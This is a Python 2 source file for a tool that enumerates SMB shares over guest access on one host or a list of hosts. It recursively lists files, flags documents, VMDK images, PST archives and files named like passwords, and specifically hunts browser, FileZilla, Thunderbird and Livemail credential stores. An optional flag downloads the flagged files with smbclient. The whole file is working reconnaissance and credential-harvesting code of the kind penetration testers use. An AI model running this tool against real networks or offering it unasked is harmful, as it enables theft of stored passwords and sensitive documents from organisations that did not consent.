#!/usr/bin/env python
import os
import sys
import re
import argparse
import commands
import multiprocessing
from smb.SMBConnection import SMBConnection

client_machine_name = 'Random Name'
remote_machine_name = 'server'

numProcesses=3

ignoreList=[]
ignoreList.append("windows")
ignoreList.append("program files")
ignoreList.append("program files(x86")

docFormat=[]
formatList=[]
formatList.append(".vmdk")
formatList.append(".xls")
formatList.append(".doc")
formatList.append(".xlsx")
formatList.append(".docx")
formatList.append(".pdf")
formatList.append(".txt")
formatList.append(".zip")
formatList.append(".pst")
formatList.append("password")
formatList.append("pass")
formatList.append("vmdk")

def downloadFiles(docList,username,password,workgroup):
	directory="Downloads"
	if not os.path.exists(directory):
    		os.makedirs(directory)
	os.chdir(directory)
	for x in docList:
		origDirectory=os.getcwd()

		#print x
		hostNo = x[1]	
		shareName = x[2].split("/")[3]
		fileName = x[2].split("/")[-1]
		
		subDir=hostNo
		if not os.path.exists(subDir):
	    		os.makedirs(subDir)
		
		os.chdir(subDir)
		r = re.compile(shareName+'(.*?)'+fileName)
		print x[2]
		m = r.search(x[2])
		if m:
			folderName = m.group(1)
			if username==None and password==None and workgroup==None:	
				cmd = 'smbclient -U "guest%" "//'+hostNo+'/'+shareName+'" -c \'recurse ; prompt ; cd \"'+folderName+'\" ; mget \"'+fileName+'\"\''
			else:
				cmd = 'smbclient -U "'+username+'%'+password+'" "//'+hostNo+'/'+shareName+'" -c \'recurse ; prompt ; cd \"'+folderName+'\" ; mget \"'+fileName+'\"\''
			print cmd
			print runCommand(cmd)
		os.chdir(origDirectory)

def runCommand(fullCmd):
    	try:
        	return commands.getoutput(fullCmd)
    	except:
        	return "Error executing command %s" %(fullCmd)

def chunk(input, size):
        return map(None, *([iter(input)] * size))

def execute1(jobs, num_processes=2):
        work_queue = multiprocessing.Queue()
        for job in jobs:
                work_queue.put(job)

        result_queue = multiprocessing.Queue()

        worker = []
        for i in range(num_processes):
                worker.append(Worker1(work_queue, result_queue))
                worker[i].start()

        results = []
        while len(results) < len(jobs): #Beware - if a job hangs, then the whole program will hang
                result = result_queue.get()
                results.append(result)
        results.sort() # The tuples in result are sorted according to the first element - the jobid
        return (results)

class Worker1(multiprocessing.Process):
        def __init__(self,work_queue,result_queue,):
                multiprocessing.Process.__init__(self)
                self.work_queue = work_queue
                self.result_queue = result_queue
                self.kill_received = False
        def run(self):
                while (not (self.kill_received)) and (self.work_queue.empty()==False):
                        try:
                                job = self.work_queue.get_nowait()
                        except:
                                break
                        (jobid,ip,shareName) = job
			try:
	                        rtnVal = (jobid,ip,str(shareName),enumerateShareName(ip,shareName))
	                        self.result_queue.put(rtnVal)
			except Exception as e:
				rtnVal = (jobid,ip,str(shareName),None)
	                        self.result_queue.put(rtnVal)

def fileMatch(ip,fullPath):
	#Firefox 
	if "key3.db" in fullPath or "signons.sqlite" in fullPath:
		credList.append(["firefox",ip,fullPath])  
	#Filezilla                       
	if "sitemanager.xml" in fullPath or "filezilla.xml" in fullPath:
		credList.append(["filezilla",ip,fullPath])  
	#Microsoft Livemail
	if ".oeaccount" in fullPath:
             	credList.append(["livemail",ip,fullPath])
	#Thunderbird
	if "Application Data\\Thunderbird\\Profiles\\" in fullPath and ".s" in fullPath:
		credList.append(["thunderbird",ip,fullPath])  

def getShares(ip,shareName,folderPath):
	conn = SMBConnection('guest', '', client_machine_name, remote_machine_name, use_ntlm_v2 = True)        
	conn.connect(ip, 445)
	filelist = conn.listPath(shareName, folderPath)
	for y in filelist:
		if y.isDirectory:
			if y.filename!="." and y.filename!="..":
				found=False
				for z in ignoreList:
					if z in str(y.filename).lower():
						found=True
				if found==False:
					getShares(ip,shareName,"\\"+folderPath+"\\"+y.filename)
		else:
			folderPath1=folderPath.replace("\\","/")
			folderPath1=folderPath1.replace("//","/")
			shareName1=shareName.replace("//","/")
			fullPath = ip+"/"+shareName1+folderPath1+"/"+y.filename
			fullPath = fullPath.replace("///","/")
			fullPath = fullPath.replace("//","/")
			fullPath = "//"+fullPath
			print fullPath
			allFilesList.append([ip,shareName1,fullPath])

			for format in formatList:
				if format in str(y.filename).lower():
					docList.append(["docs",ip,fullPath])
			fileMatch(ip,fullPath)

def enumerateShareName(ip,shareName):
	print "Attempting to access: //"+ip+"/"+shareName
	try:
		conn = SMBConnection('guest', '', client_machine_name, remote_machine_name, use_ntlm_v2 = True) 
		conn.connect(ip, 445) 
	except:
		print "Failed to Connect"
		pass
	filelist = conn.listPath(shareName, "") 
	for y in filelist:
		if y.isDirectory:
			if y.filename!="." and y.filename!="..":
				found=False
				for z in ignoreList:
					if z in str(y.filename).lower():
						found=True
				if found==False:
					addDirList.append([ip,shareName,"\\"+y.filename])
					getShares(ip,shareName,"\\"+y.filename)
		else:
			shareName1=shareName.replace("//","/")
			fullPath = ip+"/"+shareName1+"/"+y.filename
			fullPath = fullPath.replace("///","/")
			fullPath = fullPath.replace("//","/")
			fullPath = "//"+fullPath
			print fullPath
			allFilesList.append([ip,shareName1,fullPath])
			for format in formatList:
				if format in str(y.filename).lower():
					docList.append(["docs",ip,fullPath])
			fileMatch(ip,fullPath)
	
def enumerateShares(ip):
	print "Enumerating file shares on: ", ip
	try:
		conn = SMBConnection('guest', '', client_machine_name, remote_machine_name, use_ntlm_v2 = True) 
		conn.connect(ip, 445) 
	except:
		print "Failed to Connect"
		pass
	try:
		shareList = conn.listShares(timeout=10)
	except:
		shareList=None
	if shareList != None:
		shareNameList=[]
		for x in shareList:
			shareName = x.name
			print shareName
		return shareList

if __name__ == '__main__':
	print "Enumerates shares and files on SMB server"
	parser = argparse.ArgumentParser()
    	parser.add_argument('-ip', dest='hostIP',action='store', help='[IP address of SMB server]')
    	parser.add_argument('-iL', dest='ipFile',  action='store', help='[Text file containing list of SMB servers]')
    	parser.add_argument('-o', dest='outFile',  action='store', help='[Output file to store results]')
    	parser.add_argument('-n', dest='numThreads',  action='store', help='[Number of threads]')
    	parser.add_argument('-download', action='store_true', help='[Download "interesting" files]')
    	#parser.add_argument('-u', dest='username',  action='store', help='[Username]')
    	#parser.add_argument('-p', dest='password',  action='store', help='[Password]')
    	#parser.add_argument('-w', dest='workgroup',  action='store', help='[Workgroup/Domain]')

    	if len(sys.argv)==1:
        	parser.print_help()
        	sys.exit(1)
	options = parser.parse_args()

	manager = multiprocessing.Manager()	
	allFilesList = manager.list()
	addDirList = manager.list()
	docList = manager.list()
	credList = manager.list()
	
	if options.numThreads:
		numProcesses=str(options.numThreads)
	
	
	if options.ipFile:
		ipList = []
		with open(options.ipFile) as f:
			ipList = f.read().splitlines()
	
			newShareList=[]
			for ip in ipList:	
				shareList=enumerateShares(ip)
				if shareList!=None:
					for x in shareList:
						try:
							shareName = x.name
							print shareName
							newShareList.append(shareName)
						except:
							continue
			tempList = chunk(newShareList, numProcesses)
			totalCount=len(tempList)
			count=1
			for set1 in tempList:
			        jobs = []
			        jobid=0
			        print "- Set "+str(count)+" of "+str(len(tempList))
			        for shareName in set1:
			                try:
			                        if shareName!=None:
							shareName=shareName.strip()
					            	if len(shareName)>0:
			                                        print "- Checking Share: "+shareName
								#enumerateShareName(ip,shareName)
			                                        jobs.append((jobid,ip,shareName))
			                                        jobid = jobid+1
					except:
						continue
			        resultList = execute1(jobs,numProcesses)
				count+=1
		if options.outFile:
			filename = options.outFile
			print "\nResults written to "+filename
			f = open(filename, 'w')
			for x in allFilesList:
				filename = str(x[2])
				f.write(filename+"\n")
			f.close()
		if len(docList)>0:
			print "- Interesting documents found"
		 	for x in docList:
				print x[2]
		if len(credList)>0:
			print "- Files containing credentials"
		 	for x in credList:
				print x[2]
		if options.download:
			if len(docList)>0:
				print "- Downloading interesting documents"
				username=None
				password=None
				workgroup=None
				downloadFiles(docList,username,password,workgroup)
			if len(credList)>0:
				print "- Downloading files containing credentials"
				username=None
				password=None
				workgroup=None
				downloadFiles(docList,username,password,workgroup)

	if options.hostIP:
		newShareList=[]
		ip = options.hostIP
		shareList=enumerateShares(ip)
		if shareList!=None:
			for x in shareList:
				try:
					shareName = x.name
					print shareName
					newShareList.append(shareName)
				except:
					continue
		tempList = chunk(newShareList, numProcesses)
		totalCount=len(tempList)
		count=1
		for set1 in tempList:
		        jobs = []
			jobid=0
			print "- Set "+str(count)+" of "+str(len(tempList))
			for shareName in set1:
				try:
					if shareName!=None:
						shareName=shareName.strip()
						if len(shareName)>0:
							print "- Checking Share: "+shareName
							#enumerateShareName(ip,shareName)
							jobs.append((jobid,ip,shareName))
							jobid = jobid+1
				except:
					continue
			resultList = execute1(jobs,numProcesses)
			count+=1
		if options.outFile:
			filename = options.outFile
			print "\n- Results written to "+filename
			f = open(filename, 'w')
			for x in allFilesList:
				filename = str(x[2])
				f.write(filename+"\n")
			f.close()
		if len(docList)>0:
			print "- Interesting documents found"
		 	for x in docList:
				print x[2]
		if len(credList)>0:
			print "- Files containing credentials"
		 	for x in credList:
				print x[2]
		if options.download:
			if len(docList)>0:
				print "- Downloading interesting documents"
				username=None
				password=None
				workgroup=None
				downloadFiles(docList,username,password,workgroup)
			if len(credList)>0:
				print "- Downloading files containing credentials"
				username=None
				password=None
				workgroup=None
				downloadFiles(docList,username,password,workgroup)


